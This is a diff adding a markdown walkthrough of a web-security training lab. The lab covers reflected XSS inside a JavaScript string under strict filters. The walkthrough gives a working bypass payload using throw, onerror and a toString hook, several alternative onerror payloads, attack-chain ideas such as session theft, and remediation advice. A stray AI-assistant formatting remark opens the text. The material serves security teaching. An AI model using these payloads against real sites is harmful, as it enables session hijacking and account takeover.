@@ -8357,3 +8357,383 @@ If backslash is NOT escaped
 → it becomes your weapon  
 
 ---
+
+Got it — this time perfect format:
+
+✔ Headings with # / ## / ###
+✔ No merged text
+✔ Screenshot placed AFTER Lab Walkthrough
+✔ Clean fenced markdown (yellow box style)
+✔ Content fully preserved
+
+
+---
+
+---
+
+# 🐞 Lab-21 - XSS in JavaScript Context (Strict Filters + Exception Handling)
+
+---
+
+## 🔹 Overview
+
+This lab demonstrates a highly restricted reflected XSS scenario where:
+
+✔ User input is reflected inside a JavaScript string  
+✔ Multiple defenses are applied  
+
+- Special characters restricted  
+- Spaces blocked  
+- Normal function calls blocked  
+
+❌ Direct payloads like `<script>` or `alert(1)` fail  
+
+👉 Goal: Execute JavaScript despite heavy restrictions  
+
+---
+
+## 🧠 What Is This Topic?
+
+XSS inside **JavaScript context under strict filtering**
+
+---
+
+## 🔄 Flow
+
+User Input  
+→ Server Response  
+→ Injected into JS string  
+→ Filters applied  
+→ Browser parses  
+→ Indirect JS execution  
+
+---
+
+## 🧠 Key Concept
+
+❌ Direct execution → blocked  
+
+✔ Indirect execution → required  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### 1️⃣ Identify Reflection
+
+Input:
+
+```
+test123
+```
+
+Observed:
+
+```
+var data = 'test123';
+```
+
+✔ Input is inside JavaScript string  
+
+---
+
+### 2️⃣ Try Basic Payload
+
+```
+';alert(1);//
+```
+
+❌ Fails because:
+
+- Quotes escaped  
+- Special characters filtered  
+- Spaces blocked  
+
+---
+
+### 3️⃣ Analyze Restrictions
+
+❌ Spaces blocked  
+❌ Direct function calls blocked  
+❌ Standard payloads fail  
+
+---
+
+### 4️⃣ Change Strategy
+
+❌ Direct execution  
+
+✔ Indirect execution using JS behavior  
+
+---
+
+### 5️⃣ Final Payload (Encoded)
+
+```
+%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+```
+
+---
+
+### 6️⃣ Load Payload
+
+Open crafted URL  
+
+---
+
+### 7️⃣ Trigger Execution
+
+Click:
+
+Back to blog  
+
+---
+
+💥 Result:
+
+```
+alert(1337)
+```
+
+✅ Lab Solved  
+
+---
+
+## 📸 Screenshot — Final Payload Execution
+
+![final-payload](../images/strict-filters-exception-handling-final-payload.png)
+
+---
+
+## 🔍 Payload Breakdown
+
+---
+
+### 🎯 Readable Payload
+
+```
+'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+```
+
+---
+
+### 🔹 Step 1 — Break String
+
+```
+'}
+```
+
+Closes original JS string  
+
+---
+
+### 🔹 Step 2 — Create Function
+
+```
+x = x => { ... }
+```
+
+Arrow function  
+
+---
+
+### 🔹 Step 3 — Throw Error
+
+```
+throw/**/onerror=alert,1337
+```
+
+Breakdown:
+
+- `throw` → trigger error  
+- `/**/` → bypass space filter  
+- `onerror=alert` → handler  
+- `1337` → argument  
+
+---
+
+### 🔹 Step 4 — Hook toString
+
+```
+toString = x
+```
+
+Runs function when converted to string  
+
+---
+
+### 🔹 Step 5 — Trigger Execution
+
+```
+window + ''
+```
+
+Forces:
+
+```
+toString()
+```
+
+---
+
+### 💥 Execution Chain
+
+```
+window → toString → x()
+→ throw error → onerror fires
+→ alert(1337)
+```
+
+---
+
+## 🔹 Why This Works
+
+✔ JS allows indirect execution  
+✔ Errors trigger `onerror`  
+✔ Type conversion triggers `toString`  
+✔ Filters miss logical execution paths  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Analytics Scripts
+
+```
+var search = 'INPUT';
+```
+
+---
+
+### 🟢 Logging Systems
+
+```
+log('INPUT')
+```
+
+---
+
+### 🟢 SPA Data Injection
+
+```
+window.__DATA__ = 'INPUT';
+```
+
+---
+
+### 🟢 URL Parameters in JS
+
+```
+var ref = 'INPUT';
+```
+
+---
+
+### 🟢 Third-Party Widgets
+
+```
+var msg = 'INPUT';
+```
+
+---
+
+## 🔥 Advanced Tricks
+
+```
+onerror=alert;throw 1
+```
+
+```
+{onerror=alert}throw 1
+```
+
+```
+throw onerror=alert,1
+```
+
+```
+{onerror=eval}throw'=alert(1)'
+```
+
+```
+throw{message:'alert(1)'}
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Account Takeover
+
+Steal session/token  
+
+---
+
+### 🔥 Admin Compromise
+
+Execute in admin context  
+
+---
+
+### 🔥 Data Exfiltration
+
+Extract DOM data  
+
+---
+
+### 🔥 CSRF Bypass
+
+Perform actions via JS  
+
+---
+
+## 🛡️ Remediation
+
+✔ Escape quotes + backslashes  
+✔ Avoid inline JavaScript  
+✔ Use `JSON.stringify()`  
+✔ Apply CSP  
+✔ Use safe DOM APIs  
+
+---
+
+## 🧠 Pro Hunter Mindset
+
+✔ Test restrictions one by one  
+✔ Think like JavaScript engine  
+✔ Look for indirect execution  
+✔ Don’t rely on basic payloads  
+
+---
+
+## 🧠 Ultimate Mental Model
+
+Find reflection  
+↓  
+Identify JS context  
+↓  
+Understand filters  
+↓  
+Break context  
+↓  
+Use indirect execution  
+↓  
+Trigger execution  
+
+---
+
+## 🎯 Final Insight
+
+At expert level:
+
+👉 You are not injecting payloads  
+
+👉 You are abusing JavaScript logic itself  
+
+---
